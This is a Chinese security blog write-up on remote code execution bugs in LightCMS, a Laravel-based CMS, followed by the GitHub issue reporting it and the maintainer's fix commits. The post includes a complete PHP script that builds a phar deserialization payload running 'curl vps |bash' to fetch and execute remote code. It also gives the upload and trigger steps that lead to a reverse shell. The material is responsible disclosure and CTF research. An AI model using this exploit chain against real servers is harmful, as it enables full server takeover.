=== Content from igml.top_7a05db30_20250115_101330.html ===


![](/avator-new.jpg)
# gml-sec

不念过往，不畏将来

* [主页](/)
* [Archives](/archives)

所有文章
友链
关于我

![](/avator-new.jpg)

# gml-sec

不念过往，不畏将来

* [主页](/)
* [Archives](/archives)

# lightcms后台RCE漏洞挖掘

[2021-05-10](/2021/05/10/lightcms-RCE/)

## 前言

之前为了熟悉下 laravel，找了个基于 laravel 开发的 cms 审计练练手，瞄准了 lightcms。

先是挖到了一个比较简单的任意文件读取&RCE漏洞，提了issue被修复后又简单审计了一波，挖掘到了一个有意思的RCE，感觉很适合 CTF，就拿来出题了，被用做了今年红帽杯的初赛。很遗憾由于放出题目时间较晚+很多dalao去打津门杯了，这道题只有两个队伍解出。

题目环境链接：<https://github.com/gml-sec/My-CTF-Challenges/tree/main/2021-Redhat-ezlight>。

关于lightcms的简单介绍：

> `lightCMS`是一个轻量级的`CMS`系统，也可以作为一个通用的后台管理框架使用。`lightCMS`集成了用户管理、权限管理、日志管理、菜单管理等后台管理框架的通用功能，同时也提供模型管理、分类管理等`CMS`系统中常用的功能。

github地址：<https://github.com/eddy8/LightCMS>

## v1.3.5 任意文件读取&RCE漏洞

这个漏洞出在 `app/Http/Controllers/Admin/NEditorController.php`中的远程下载图片的功能：

![image-20210510001913866](/2021/05/10/lightcms-RCE/image-20210510001913866.png)

这里简单使用了 `file_get_contents`来获取文件内容，并保存，所以我们可以使用file协议实现任意文件读取等ssrf操作。更危险的是这里的逻辑是取到的文件名后缀是什么，保存的就是什么后缀，所以我们可以放一个php一句话在服务器上，然后来请求，那么我们就可以getshell。

具体可见<https://github.com/eddy8/LightCMS/issues/19>。

## v1.3.7 RCE漏洞

提了个issue后，作者也是及时进行了修复，分析下patch的操作，增加了一个 fetchImageFile 函数处理：

![image-20210510002401236](/2021/05/10/lightcms-RCE/image-20210510002401236.png)

跟进分析 fetchImageFile：

![image-20210510002453997](/2021/05/10/lightcms-RCE/image-20210510002453997.png)

可以看到使用了curl来获取远程资源的内容，然后使用 Image:make 模块进行解析。并且对后缀也进行了严格的过滤。同时这个 cms 大多都是数据库操作，涉及文件操作少之又少，看起来是无法直接RCE的。

laravel 框架开发我自然联想到了反序列化，并且这个cms 后台还是有图片上传功能的，能不能利用 phar 反序列化实现 RCE 呢？

### POP链

正式版本Laravel 版本是 6.20.16，测试发现 5.8 版本利用 `dispatch`方法的RCE链在6.20.16版本可以使用。经过测试 7.x 版本也可以使用这条链。[这篇文章](https://www.anquanke.com/post/id/231079)分析到了laravel 8 的链子，不过多赘述了。

### 文件上传

有了 RCE 链，我们需要将 phar 文件传上去。patch 过的远程下载图片功能，使用了`Intervention\Image\Facades\Image`库来进行图片解析，对文件内容检查较为严格，但是本地图片上传处较为松散，使用一般的添加 GIF 文件头的方法就可以成功上传。

### 触发点

最后一步也就是相对困难的一步，需要找到触发phar的点，即我们可控的一个文件处理函数。其实前面提到了这个cms并没有太多文件操作。

注意到修复代码 `fetchImageFile`函数存在如下操作：

![image-20210510003422513](/2021/05/10/lightcms-RCE/image-20210510003422513.png)

在获取到远程url的内容后，会调用 `Intervention\Image\Facades\Image`的 `make`方法，对图片内容进行解析。

看到这里我隐约想起之前见过 `Image:make($url)`这种用法，那么这里的 url 能不能有类似 file\_get\_content 之类的文件操作呢？

跟进，会跳到 `vendor/intervention/image/src/Intervention/Image/AbstractDecoder.php`中 `AbstractDecoder`类的 `init`方法，判断数据类型：

![image-20210510003643456](/2021/05/10/lightcms-RCE/image-20210510003643456.png)

可以看到 data 不仅可以是图片的二进制数据 ，还可以是这些数据格式，跟进 `initFromUrl`方法：

![image-20210510003659411](/2021/05/10/lightcms-RCE/image-20210510003659411.png)

非常明显的 file\_get\_contents，那么最后触发点的问题也解决了，我们可以在 vps 上放置一个 txt 文件，内容为 `phar://./upload/xxx`，然后让服务器来取这个文件，即可触发反序列化。

### RCE流程

首先生成 phar 文件:

| ``` 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455 ``` | ``` <?phpnamespace Illuminate\Broadcasting{    class PendingBroadcast    {        protected $events;        protected $event;        public function __construct($events, $event)        {            $this->events = $events;            $this->event = $event;        }    }    class BroadcastEvent    {      protected $connection;      public function __construct($connection)      {        $this->connection = $connection;      }    }}namespace Illuminate\Bus{    class Dispatcher{        protected $queueResolver;        public function __construct($queueResolver)        {          $this->queueResolver = $queueResolver;        }    }}namespace{    $command = new Illuminate\Broadcasting\BroadcastEvent('curl vps |bash');    $dispater = new Illuminate\Bus\Dispatcher("system");    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispater,$command);    $phar = new Phar('phar.phar');    $phar -> stopBuffering();    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");     $phar -> addFromString('test.txt','test');    $phar -> setMetadata($PendingBroadcast);    $phar -> stopBuffering();    rename('phar.phar','phar.jpg');} ``` |
| --- | --- |

在后台添加文章处上传图片：

![image-20210510003829527](/2021/05/10/lightcms-RCE/image-20210510003829527.png)

得到文件路径 `upload/image/202102/AciwTtmKQ7IQN4gdeoiZ6ve4A0LSK48SGJGk38df.gif`。

在 vps 上放置一个文件，内容为 `phar://./upload/image/202102/AciwTtmKQ7IQN4gdeoiZ6ve4A0LSK48SGJGk38df.gif`，让服务器来取这个文件：

![image-20210510003921345](/2021/05/10/lightcms-RCE/image-20210510003921345.png)

可以反弹shell：

![image-20210510003934994](/2021/05/10/lightcms-RCE/image-20210510003934994.png)

## 总结

这个漏洞虽然利用起来并不算复杂，但是 phar 触发点相对隐秘一些，不容易被发现，这个操作也是之前没有见过的（感觉很适合CTF 2333），还是挺有趣的，只可惜感觉打的人不太多。

赏

* PHP
* laravel
* 反序列化

* [PHP](/categories/PHP//)
* [Web](/categories/PHP/Web//)
* [反序列化](/categories/PHP/Web/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96//)

扫一扫，分享到微信

![微信分享二维码](data:image/png;base64...)

[2021 祥云杯wp](/2021/08/22/2021-xiangyuncup/)
[2021 D^3CTF Web 部分wp](/2021/03/08/2021-D3CTF/)

1. [1. 前言](#%E5%89%8D%E8%A8%80)
2. [2. v1.3.5 任意文件读取&RCE漏洞](#v1-3-5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-amp-RCE%E6%BC%8F%E6%B4%9E)
3. [3. v1.3.7 RCE漏洞](#v1-3-7-RCE%E6%BC%8F%E6%B4%9E)
   1. [3.1. POP链](#POP%E9%93%BE)
   2. [3.2. 文件上传](#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
   3. [3.3. 触发点](#%E8%A7%A6%E5%8F%91%E7%82%B9)
   4. [3.4. RCE流程](#RCE%E6%B5%81%E7%A8%8B)
4. [4. 总结](#%E6%80%BB%E7%BB%93)

© 2022 gml-sec

[Hexo](http://hexo.io/) Theme [Yilia](https://github.com/litten/hexo-theme-yilia) by Litten

* 所有文章
* 友链
* 关于我

tag:

* CTF
* Crypto
* Web
* CTF.wp
* wp
* Wordpress
* huawei-cloud
* ciscn
* url编码绕过
* D^3CTF
* PHP
* laravel
* 反序列化
* 解决方法
* 线下
* Misc
* Datacon

缺失模块。

* [glzjin](https://www.zhaoj.in/)
* [T1an5t](https://tianstcht.github.io/)
* [JrXnm](https://blog.szfszf.top/)
* [lFY](https://lfysec.top/)
* [Twings](https://aluvion.gitee.io/)
* [evoA](https://evoa.me/)
* [Y1ng](https://www.gem-love.com/)
* [xuanxuan](https://xuanxuanblingbling.github.io/)
* [ha1c9on](https://ha1c9on.top)
* [Zeddy](https://blog.zeddyu.info/)
* [Apeng](https://apeng.re)
* [Decade](https://wulidecade.cn)
* [Crazyman](https://hackmd.io/%40crazyman)
* [mcfx](https://mcfx.us/)

<div id="js-aboutme">NISL@THU 20级硕士生<br><a href="http://netsec.ccert.edu.cn/people/gml20">实验室个人主页</a><br>CTFer in <a href="https://redbud.info/">Redbud</a> and <a href="https://www.tea-deliverers.cn/">Tea Deliverers</a> <br>关注 Web 安全、IoT 安全、协议安全等</div>



=== Content from github.com_40c01d21_20250115_101326.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feddy8%2FLightCMS%2Fissues%2F21)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feddy8%2FLightCMS%2Fissues%2F21)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=eddy8%2FLightCMS)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[eddy8](/eddy8)
/
**[LightCMS](/eddy8/LightCMS)**
Public

* [Notifications](/login?return_to=%2Feddy8%2FLightCMS) You must be signed in to change notification settings
* [Fork
  86](/login?return_to=%2Feddy8%2FLightCMS)
* [Star
   354](/login?return_to=%2Feddy8%2FLightCMS)

* [Code](/eddy8/LightCMS)
* [Issues
  1](/eddy8/LightCMS/issues)
* [Pull requests
  0](/eddy8/LightCMS/pulls)
* [Discussions](/eddy8/LightCMS/discussions)
* [Actions](/eddy8/LightCMS/actions)
* [Projects
  0](/eddy8/LightCMS/projects)
* [Security](/eddy8/LightCMS/security)
* [Insights](/eddy8/LightCMS/pulse)

Additional navigation options

* [Code](/eddy8/LightCMS)
* [Issues](/eddy8/LightCMS/issues)
* [Pull requests](/eddy8/LightCMS/pulls)
* [Discussions](/eddy8/LightCMS/discussions)
* [Actions](/eddy8/LightCMS/actions)
* [Projects](/eddy8/LightCMS/projects)
* [Security](/eddy8/LightCMS/security)
* [Insights](/eddy8/LightCMS/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Feddy8%2FLightCMS%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Feddy8%2FLightCMS%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# RCE vulnerability in lightcms v1.3.7 #21

Closed

[gml-sec](/gml-sec) opened this issue
May 9, 2021
· 1 comment

Closed

# [RCE vulnerability in lightcms v1.3.7](#top) #21

[gml-sec](/gml-sec) opened this issue
May 9, 2021
· 1 comment

## Comments

[![@gml-sec](https://avatars.githubusercontent.com/u/35568193?s=80&u=19a573bc22a24854d5e6d749b270c0a84338b315&v=4)](/gml-sec)

Copy link

### **[gml-sec](/gml-sec)** commented [May 9, 2021](#issue-882553313)

| Description The `image:make` function in fetchImageFile can trigger phar deserialization. Combined with the deserialization chain of the laravel framework, it can cause remote code execution vulnerabilities. Impact Version lightcms latest version (v1.3.7) Steps to Reproduce Please see this [link](https://igml.top/2021/05/10/lightcms-RCE/) for details. |
| --- |
| The text was updated successfully, but these errors were encountered: |

 👍
1
 eddy8 reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

[eddy8](/eddy8)
added a commit
that referenced
this issue
[May 11, 2021](#ref-commit-ba815d5)
[![@eddy8](https://avatars.githubusercontent.com/u/2555476?s=40&u=7fca82f1c619b6fe113e9f434e394213ce12ee21&v=4)](/eddy8)

`[fix: catchImage](/eddy8/LightCMS/commit/ba815d58308f57a413770778faa7149d35fac0b7 "fix: catchImage #21") [#21](https://github.com/eddy8/LightCMS/issues/21)`

`[ba815d5](/eddy8/LightCMS/commit/ba815d58308f57a413770778faa7149d35fac0b7)`

[![@eddy8](https://avatars.githubusercontent.com/u/2555476?s=80&u=7fca82f1c619b6fe113e9f434e394213ce12ee21&v=4)](/eddy8)

Copy link

Owner

### **[eddy8](/eddy8)** commented [May 11, 2021](#issuecomment-837592757)

| thanks^\_ |
| --- |

All reactions

Sorry, something went wrong.

[![@eddy8](https://avatars.githubusercontent.com/u/2555476?s=40&u=7fca82f1c619b6fe113e9f434e394213ce12ee21&v=4)](/eddy8)
[eddy8](/eddy8)
closed this as [completed](/eddy8/LightCMS/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[May 11, 2021](#event-4722094927)

[eddy8](/eddy8)
added a commit
that referenced
this issue
[May 11, 2021](#ref-commit-f240c7f)
[![@eddy8](https://avatars.githubusercontent.com/u/2555476?s=40&u=7fca82f1c619b6fe113e9f434e394213ce12ee21&v=4)](/eddy8)

`[fix: catchImage](/eddy8/LightCMS/commit/f240c7fcc43257ad35af209bdf6a9ebfb3749f8b "fix: catchImage #21") [#21](https://github.com/eddy8/LightCMS/issues/21)`

`[f240c7f](/eddy8/LightCMS/commit/f240c7fcc43257ad35af209bdf6a9ebfb3749f8b)`

[eddy8](/eddy8)
added a commit
that referenced
this issue
[May 11, 2021](#ref-commit-52820f6)
[![@eddy8](https://avatars.githubusercontent.com/u/2555476?s=40&u=7fca82f1c619b6fe113e9f434e394213ce12ee21&v=4)](/eddy8)

`[fix: catchImage](/eddy8/LightCMS/commit/52820f65a5e12fd63b0694a57063d9c47453b048 "fix: catchImage #21") [#21](https://github.com/eddy8/LightCMS/issues/21)`

`[52820f6](/eddy8/LightCMS/commit/52820f65a5e12fd63b0694a57063d9c47453b048)`

[eddy8](/eddy8)
added a commit
that referenced
this issue
[May 12, 2021](#ref-commit-9630ee4)
[![@eddy8](https://avatars.githubusercontent.com/u/2555476?s=40&u=7fca82f1c619b6fe113e9f434e394213ce12ee21&v=4)](/eddy8)

`[fix](/eddy8/LightCMS/commit/9630ee4fb1c468950756d4ed360fd35e3ca4ebfc "fix: #21")[:](/eddy8/LightCMS/commit/9630ee4fb1c468950756d4ed360fd35e3ca4ebfc "fix: #21") [#21](https://github.com/eddy8/LightCMS/issues/21)`

`[9630ee4](/eddy8/LightCMS/commit/9630ee4fb1c468950756d4ed360fd35e3ca4ebfc)`

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Feddy8%2FLightCMS%2Fissues%2F21)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

2 participants

[![@eddy8](https://avatars.githubusercontent.com/u/2555476?s=52&v=4)](/eddy8) [![@gml-sec](https://avatars.githubusercontent.com/u/35568193?s=52&v=4)](/gml-sec)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


